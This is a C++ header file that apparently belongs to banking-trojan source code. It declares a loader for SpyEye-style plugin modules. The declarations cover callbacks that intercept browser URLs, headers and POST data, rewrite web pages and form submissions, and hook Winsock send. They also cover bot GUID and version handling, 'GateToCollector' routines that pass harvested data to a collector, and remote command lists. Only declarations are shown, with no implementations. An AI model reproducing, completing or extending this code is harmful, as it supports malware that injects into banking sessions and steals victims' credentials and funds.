#pragma once

#include <Windows.h>
#include <wininet.h>
#include <ws2tcpip.h>

#define RtlOffsetToPointer(B,O) ((PCHAR)(((PCHAR)(B)) + ((ULONG_PTR)(O))))
#define MAKE_PTR(B, O, T) ((T)RtlOffsetToPointer(B, O))

typedef DWORD (FAR __cdecl *IMAGE_LOAD_NOTIFY_ROUTINE)(void* image_base, LPSTR module_name, LPSTR params);

typedef BOOL (__cdecl *GATETOCOLLECTOR3)(DWORD type, LPWSTR sourcePath, LPWSTR string, DWORD stringSize);
typedef BOOL (__cdecl *WRITEDATA)(DWORD type, LPWSTR sourcePath, void *data, DWORD dataSize);
typedef void (__fastcall *DEBUGWRITESTRING)(LPSTR pstrFuncName, LPSTR pstrSourceFile, DWORD dwLineNumber, BYTE bType, LPWSTR pstrFormat, ...);

typedef BOOL (__cdecl *INIT)(char *szConfig);
typedef BOOL (__cdecl *START)();
typedef BOOL (__cdecl *STOP)();
typedef VOID (__cdecl *TAKEGATETOCOLLECTOR)(void *lpGateFunc);
typedef VOID (__cdecl *TAKEGATETOCOLLECTOR2)(void *lpGateFunc2);
typedef VOID (__cdecl *TAKEGATETOCOLLECTOR3)(void *lpGateFunc2);
typedef VOID (__cdecl *TAKEWRITEDATA)(void *lpGateFunc4);
typedef VOID (__cdecl *TAKEBOTGUID)(IN PCHAR szBotGuid);
typedef VOID (__cdecl *TAKEBOTPATH)(IN PCHAR szBotPath);
typedef VOID (__cdecl *TAKEBOTVERSION)(IN DWORD dwBotVersion);
typedef DWORD (__cdecl *GETSTATE)();
typedef BOOL (__cdecl *KEEPALIVE)();
typedef BOOL (__cdecl *ISGLOBAL)();
typedef VOID (__cdecl *CALLBACK_ONBEFOREPROCESSURL)(IN PCHAR szUrl, IN PCHAR szVerb, IN PCHAR szHeaders, IN PCHAR szPostVars, OUT PDWORD lpdwProcessMode);
typedef VOID (__cdecl *CALLBACK_ONBEFORELOADPAGE3)(IN PCHAR szUrl, IN PCHAR szVerb, IN PCHAR szHeaders, IN PCHAR szPostVars, OUT PCHAR *lpszContent, OUT PDWORD lpdwSize);
typedef VOID (__cdecl *CALLBACK_ONAFTERLOADINGPAGE)(IN PCHAR szUrl, IN PCHAR szVerb, IN PCHAR szHeaders, IN PCHAR szPageContent, OUT PCHAR * szOut, IN OUT PDWORD lpdwSize);
typedef VOID (__cdecl *CALLBACK_CHANGEPOSTREQUEST)(IN PCHAR szUrl, IN PCHAR szVerb, IN PCHAR szInPostVars, IN DWORD dwInPostVarsSize, OUT PCHAR * szOutPostVars, OUT PDWORD lpdwOutPostVarsSize);
typedef VOID (__cdecl *FREEMEM)(IN LPVOID lpMem);
typedef VOID (__cdecl *TAKEGETPAGE)(IN LPVOID lpGetPageFunc);
typedef VOID (__cdecl *TAKEGETPAGE2)(IN LPVOID lpGetPage2Func);
typedef VOID (__cdecl *TAKEFREEMEM)(IN LPVOID lpFreeMemFunc);
typedef BOOL (__cdecl *CALLBACK___WS2_32___SEND)(IN LPVOID lpOriginalFunction, IN SOCKET s, IN const char *buf, IN int size, IN int flags, OUT LPVOID lpReturn);
typedef VOID (__cdecl *TAKECONFIGCRC32CALLBACK)(IN LPVOID lpFunc);
typedef VOID (__cdecl *TAKEBOTEXEMD5CALLBACK)(IN LPVOID lpFunc);
typedef VOID (__cdecl *TAKEPLUGINSLISTCALLBACK)(IN LPVOID lpFunc);
typedef VOID (__cdecl *TAKEMAINCPGATEOUTPUTCALLBACK)(IN LPVOID lpFunc);
typedef VOID (__cdecl *TAKESTARTEXE)(IN LPVOID lpFunc);
typedef VOID (__cdecl *TAKEWINVERSION)(DWORD winVersion);
typedef VOID (__cdecl *TAKEDEBUGGATE)(PVOID lpDebugGate);
typedef DWORD (__cdecl *RUN)(LPVOID* arguments, DWORD count);

namespace SpyEye_Modules
{
	enum
	{
		SM_ERROR,
		SM_INVALID_ARGUMENTS,
		SM_VALID_MODULE,
		SM_INVALID_MODULE,
	};

	enum
	{
		SM_FUNC_INIT,
		SM_FUNC_START,
		SM_FUNC_STOP,
		SM_FUNC_RUN, //Custom, not spyeye
		SM_FUNC_BEFOREPROCESSURL,
		SM_FUNC_BEFORELOADPAGE,
		SM_FUNC_AFTERLOADINGPAGE,
		SM_FUNC_CHANGEPOSTREQUEST,
	};

	typedef enum 
	{
        PLUGIN_OFF,     // Плагин "выключен". Функция Start() не вызывалась
        PLUGIN_ON       // Плагин "включён". Функция Start() вызывалась
	} PLUGINState;

	enum
	{
		MODULE_NOT_PERSISTENT,
		MODULE_IS_PERSISTENT,
		MODULE_NOT_FOUND,
		MODULE_INVALID_ARGUMENTS,
	};

	typedef struct _LOADED_MODULE
	{
		//Main data.
		void* reserved;
		bool keep_alive;
		DWORD module_crc32;
		LPSTR module_name;
		void* module_base;
		//Callbacks.
		struct
		{
			START Start;
			STOP Stop;
			GETSTATE GetState;
			CALLBACK_ONBEFOREPROCESSURL OnBeforeProcessUrl;
			CALLBACK_ONBEFORELOADPAGE3 OnBeforeLoadPage3;
			CALLBACK_ONAFTERLOADINGPAGE OnAfterLoadingPage;
			CALLBACK_CHANGEPOSTREQUEST ChangePostRequest;
			CALLBACK___WS2_32___SEND WS2_Send_Callback;
		} exported_functions;
		//Links.
		_LOADED_MODULE* next;
		_LOADED_MODULE* prev;
	}LOADED_MODULE, *PLOADED_MODULE;

	typedef struct
	{
		PLOADED_MODULE first;
		PLOADED_MODULE last;
	}LOADED_MODULE_LIST, *PLOADED_MODULE_LIST;

	typedef struct
	{
		SIZE_T function_switcher;
		void* function_ptr;
		void* arg1;
		DWORD count;
	}WORKER_ITEM, *PWORKER_ITEM;

	typedef struct _COMMAND_LIST
	{
		DWORD ModuleCrc32;
		DWORD FunctionCrc32;
		LPVOID* Parameters;
		DWORD Count;
		_COMMAND_LIST* next;
	}COMMAND_LIST, *PCOMMAND_LIST;

	void init();

	void uninit();

	PLOADED_MODULE InsertModule(void* image_base, LPSTR module_name);

	DWORD __cdecl ImageLoadNotifyRoutine(void* image_base, LPSTR module_name, LPSTR params);

	DWORD __cdecl ImageUnloadNotifyRoutine(void* image_base, LPSTR module_name);

	BOOL __cdecl GateToCollector3(DWORD type, LPWSTR sourcePath, LPWSTR string, DWORD stringSize);
	BOOL __cdecl WriteData(DWORD type, LPWSTR sourcePath, void *data, DWORD dataSize);

	void __cdecl GateToCollector(IN PBYTE data, IN DWORD size);
	void __cdecl GateToCollector2(IN PBYTE data, IN DWORD size); //Separate thread.

	DWORD WebMainCallback(DWORD switcher, LPSTR Url = NULL, LPSTR Verb = NULL, LPSTR Headers = NULL, LPSTR PostVars = NULL, LPSTR* lpContent = NULL, LPDWORD dwContentSize = NULL);

	/*
		Return - 0 if no errors,
				 n - n errors.
	*/
	DWORD ExecuteCommands(PCOMMAND_LIST cmdList);
}